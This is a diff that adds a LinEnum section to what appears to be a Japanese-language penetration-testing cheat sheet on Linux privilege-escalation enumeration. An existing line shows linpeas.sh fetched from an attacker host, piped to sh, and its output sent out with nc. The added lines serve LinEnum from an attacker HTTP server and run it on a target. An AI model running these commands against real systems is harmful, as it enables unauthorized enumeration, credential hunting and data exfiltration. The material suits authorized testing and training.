@@ -54,6 +54,31 @@ curl <AttackerIP>:8888/linpeas.sh | sh | nc -q 0 <AttackerIP> 9002
 ```
 
 ---
+
+## LinEnum
+
+### 転送・実行
+
+```sh
+# Attacker
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
+
+python -m http.server 8888
+```
+```sh
+# Target
+wget <AttackerIP>:8888/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh -k password -r linenum.out -e /tmp/ -t
+```
+
+### 実行結果抽出
+
+```sh
+
+```
+
+---
 ---
 
 # Manual
